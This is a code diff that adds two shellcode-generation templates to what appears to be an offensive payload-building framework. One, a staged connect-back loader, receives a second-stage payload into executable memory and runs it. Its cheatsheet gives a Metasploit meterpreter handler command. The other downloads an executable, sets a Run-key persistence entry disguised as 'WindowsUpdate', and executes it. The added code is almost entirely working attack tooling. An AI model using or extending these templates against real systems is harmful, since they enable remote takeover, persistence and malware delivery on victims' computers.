@@ -27,6 +27,10 @@ Reference workflows:
   - folder_path_exec: SHGetFolderPathA (Desktop/AppData) + CopyFileA + WinExec
   - profile_dir_exec: OpenProcessToken + GetUserProfileDirectoryA +
     MoveFileA + CreateProcessA
+  - staged_socket: WSAStartup + WSASocketA + connect + recv into
+    VirtualAlloc'd RWX memory + CreateThread (staged payload execution)
+  - download_persist: URLDownloadToFileA + RegOpenKeyExA + RegSetValueExA
+    (download + HKCU Run key persistence in one workflow)
 """
 from __future__ import annotations
 
@@ -2972,4 +2976,322 @@ class IRProfileDirExecTemplate(WorkflowTemplate):
             ("Appended filename", fname),
             ("Path via OpenProcessToken + GetUserProfileDirectoryA", ""),
             ("Moves file then executes via CreateProcessA (10 args)", ""),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Staged socket execution workflow (recv shellcode + execute in memory)
+# ---------------------------------------------------------------------------
+
+
+def build_staged_socket_workflow(
+    lhost: str = "127.0.0.1",
+    lport: int = 4444,
+    alloc_size: int = 0x1000,
+    exit_strategy: ExitStrategy = ExitStrategy.THREAD_ONLY,
+) -> Workflow:
+    """Build the staged_socket reference workflow.
+
+    WSAStartup -> WSASocketA -> connect(lhost:lport) ->
+    VirtualAlloc(NULL, size, MEM_COMMIT|RESERVE, PAGE_RWX) ->
+    recv(socket, alloc, size, 0) ->
+    CreateThread(NULL, 0, alloc, NULL, 0, NULL) ->
+    WaitForSingleObject(thread, INFINITE) -> exit
+
+    Receives a second-stage payload over TCP into executable memory and
+    runs it in a new thread. This is the classic staged execution pattern:
+    the first stage (this shellcode) is small and connects back; the
+    listener sends the real payload which executes in-process.
+
+    Default exit_strategy is THREAD_ONLY so the host process survives.
+    """
+    port_be = _socket.htons(lport)
+    ip_le = _struct.unpack("<I", _socket.inet_aton(lhost))[0]
+
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_staged_socket",
+        blocks=(
+            Block("entry", (
+                DefineConstant("sin_port_be", port_be),
+                DefineConstant("sin_addr_le", ip_le),
+                DefineConstant("af_inet", 2),
+                AllocateStruct("wsadata", "WSADATA"),
+                AllocateStruct("sa", "sockaddr_in"),
+                CallAPI(
+                    "WSAStartup",
+                    arguments=(Immediate(0x0202), AddressOf("wsadata")),
+                    result="wsa_ret",
+                ),
+                Compare("wsa_ret", SuccessPredicate.ZERO,
+                        true_block="create_socket", false_block="fail"),
+            )),
+            Block("create_socket", (
+                CallAPI(
+                    "WSASocketA",
+                    arguments=(
+                        Immediate(2),    # AF_INET
+                        Immediate(1),    # SOCK_STREAM
+                        Immediate(6),    # IPPROTO_TCP
+                        Immediate(0),
+                        Immediate(0),
+                        Immediate(0),
+                    ),
+                    result="socket_handle",
+                ),
+                Compare("socket_handle", SuccessPredicate.INVALID_HANDLE,
+                        true_block="connect_socket", false_block="fail"),
+            )),
+            Block("connect_socket", (
+                ZeroStruct("sa"),
+                WriteStructField("sa", "sin_family", NameRef("af_inet")),
+                WriteStructField("sa", "sin_port", NameRef("sin_port_be")),
+                WriteStructField("sa", "sin_addr", NameRef("sin_addr_le")),
+                CallAPI(
+                    "connect",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        AddressOf("sa"),
+                        Immediate(0x10),
+                    ),
+                    result="conn_ret",
+                ),
+                Compare("conn_ret", SuccessPredicate.ZERO,
+                        true_block="alloc_memory", false_block="fail"),
+            )),
+            Block("alloc_memory", (
+                CallAPI(
+                    "VirtualAlloc",
+                    arguments=(
+                        Immediate(0),           # lpAddress = NULL
+                        Immediate(alloc_size),  # dwSize
+                        Immediate(0x3000),      # MEM_COMMIT | MEM_RESERVE
+                        Immediate(0x40),        # PAGE_EXECUTE_READWRITE
+                    ),
+                    result="rwx_buf",
+                ),
+                Compare("rwx_buf", SuccessPredicate.NONZERO,
+                        true_block="recv_stage", false_block="fail"),
+            )),
+            Block("recv_stage", (
+                CallAPI(
+                    "recv",
+                    arguments=(
+                        NameRef("socket_handle"),
+                        NameRef("rwx_buf"),
+                        Immediate(alloc_size),
+                        Immediate(0),           # flags = 0
+                    ),
+                    result="recv_ret",
+                ),
+                Compare("recv_ret", SuccessPredicate.NONZERO,
+                        true_block="exec_stage", false_block="fail"),
+            )),
+            Block("exec_stage", (
+                CallAPI(
+                    "CreateThread",
+                    arguments=(
+                        Immediate(0),       # lpThreadAttributes = NULL
+                        Immediate(0),       # dwStackSize = 0
+                        NameRef("rwx_buf"), # lpStartAddress
+                        Immediate(0),       # lpParameter = NULL
+                        Immediate(0),       # dwCreationFlags = 0
+                        Immediate(0),       # lpThreadId = NULL
+                    ),
+                    result="hthread",
+                ),
+                Compare("hthread", SuccessPredicate.NONZERO,
+                        true_block="wait_thread", false_block="fail"),
+            )),
+            Block("wait_thread", (
+                CallAPI(
+                    "WaitForSingleObject",
+                    arguments=(
+                        NameRef("hthread"),
+                        Immediate(0xFFFFFFFF),  # INFINITE
+                    ),
+                ),
+                Jump("success"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRStagedSocketTemplate(WorkflowTemplate):
+    """IR-backed staged_socket template (recv + execute in memory)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_staged_socket_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_staged_socket_workflow(
+            lhost=config.lhost,
+            lport=config.lport,
+            alloc_size=config.alloc_size or 0x1000,
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        size = config.alloc_size or 0x1000
+        return [
+            ("Connect back to", f"{config.lhost}:{config.lport}"),
+            ("RWX allocation size", f"0x{size:X} ({size} bytes)"),
+            ("Listener sends second-stage payload", ""),
+            ("Stage executes in-process via CreateThread", ""),
+            ("Start listener", f"msfconsole -x 'use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {config.lhost}; set LPORT {config.lport}; run'"),
+        ]
+
+
+# ---------------------------------------------------------------------------
+# Download + persist workflow (URLDownloadToFileA + HKCU Run key)
+# ---------------------------------------------------------------------------
+
+
+def build_download_persist_workflow(
+    url: str = "http://host/payload.exe",
+    dst_path: str = r"C:\Users\Public\payload.exe",
+    reg_key_path: str = _DEFAULT_REG_KEY,
+    reg_value_name: str = "WindowsUpdate",
+    exit_strategy: ExitStrategy = ExitStrategy.EXIT_PROCESS,
+) -> Workflow:
+    """Build the download_persist reference workflow.
+
+    LoadLibraryA(urlmon.dll) ->
+    URLDownloadToFileA(NULL, url, dst, 0, NULL) ->
+    LoadLibraryA(advapi32.dll) ->
+    RegOpenKeyExA(HKCU, Run, KEY_SET_VALUE) ->
+    lstrlenA(dst) ->
+    RegSetValueExA(key, value_name, REG_SZ, dst, len) ->
+    RegCloseKey ->
+    WinExec(dst) -> exit
+
+    Downloads a file from HTTP, writes it to the HKCU Run key for boot
+    persistence, then executes it. Combines the url_download and
+    registry_persistence patterns into a single workflow.
+    """
+    success, fail = _make_exit_blocks(exit_strategy)
+    return Workflow(
+        name="ir_download_persist",
+        blocks=(
+            Block("entry", (
+                ConstructString("urlmon_dll", "urlmon.dll"),
+                ConstructString("advapi_dll", "advapi32.dll"),
+                ConstructString("url", url),
+                ConstructString("dst_path", dst_path),
+                ConstructString("reg_key_path", reg_key_path),
+                ConstructString("reg_value_name", reg_value_name),
+                AllocateLocal("hkey_out"),
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("urlmon_dll"),),
+                    result="urlmon_base",
+                ),
+                CallAPI(
+                    "URLDownloadToFileA",
+                    arguments=(
+                        Immediate(0),          # pCaller = NULL
+                        AddressOf("url"),
+                        AddressOf("dst_path"),
+                        Immediate(0),          # dwReserved
+                        Immediate(0),          # lpfnCB = NULL
+                    ),
+                    result="dl_ret",
+                ),
+                Compare("dl_ret", SuccessPredicate.ZERO,
+                        true_block="persist", false_block="fail"),
+            )),
+            Block("persist", (
+                CallAPI(
+                    "LoadLibraryA",
+                    arguments=(AddressOf("advapi_dll"),),
+                    result="advapi_base",
+                ),
+                CallAPI(
+                    "RegOpenKeyExA",
+                    arguments=(
+                        Immediate(0x80000001),  # HKEY_CURRENT_USER
+                        AddressOf("reg_key_path"),
+                        Immediate(0),
+                        Immediate(0x0002),      # KEY_SET_VALUE
+                        AddressOf("hkey_out"),
+                    ),
+                    result="reg_open_ret",
+                ),
+                Compare("reg_open_ret", SuccessPredicate.ZERO,
+                        true_block="set_value", false_block="run_anyway"),
+            )),
+            Block("set_value", (
+                CallAPI(
+                    "lstrlenA",
+                    arguments=(AddressOf("dst_path"),),
+                    result="path_len",
+                ),
+                CallAPI(
+                    "RegSetValueExA",
+                    arguments=(
+                        NameRef("hkey_out"),
+                        AddressOf("reg_value_name"),
+                        Immediate(0),           # Reserved
+                        Immediate(1),           # REG_SZ
+                        AddressOf("dst_path"),
+                        NameRef("path_len"),
+                    ),
+                ),
+                CallAPI(
+                    "RegCloseKey",
+                    arguments=(NameRef("hkey_out"),),
+                ),
+                Jump("run_payload"),
+            )),
+            Block("run_anyway", (
+                Jump("run_payload"),
+            )),
+            Block("run_payload", (
+                CallAPI(
+                    "WinExec",
+                    arguments=(AddressOf("dst_path"), Immediate(0)),
+                    result="exec_ret",
+                ),
+                Compare("exec_ret", SuccessPredicate.NONZERO,
+                        true_block="success", false_block="fail"),
+            )),
+            success,
+            fail,
+        ),
+        entry="entry",
+    )
+
+
+class IRDownloadPersistTemplate(WorkflowTemplate):
+    """IR-backed download_persist template (URLDownloadToFileA + HKCU Run key)."""
+
+    def __init__(self) -> None:
+        super().__init__(build_download_persist_workflow())
+
+    def _resolve_workflow(self, config: TemplateConfig) -> Workflow:
+        strategy = _parse_exit_strategy(config.exit_strategy)
+        return build_download_persist_workflow(
+            url=config.url or "http://host/payload.exe",
+            dst_path=config.dst_path or r"C:\Users\Public\payload.exe",
+            reg_key_path=config.reg_key_path or _DEFAULT_REG_KEY,
+            reg_value_name=config.reg_value_name or "WindowsUpdate",
+            exit_strategy=strategy,
+        )
+
+    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
+        url = config.url or "http://host/payload.exe"
+        dst = config.dst_path or r"C:\Users\Public\payload.exe"
+        key = config.reg_key_path or _DEFAULT_REG_KEY
+        val = config.reg_value_name or "WindowsUpdate"
+        return [
+            ("Download URL", url),
+            ("Destination path", dst),
+            ("Registry key", f"HKCU\\{key}"),
+            ("Value name", val),
+            ("Start HTTP server", "python3 -m http.server 80 --directory /path/to/payloads"),
+            ("Downloads, persists via Run key, then executes", ""),
         ]
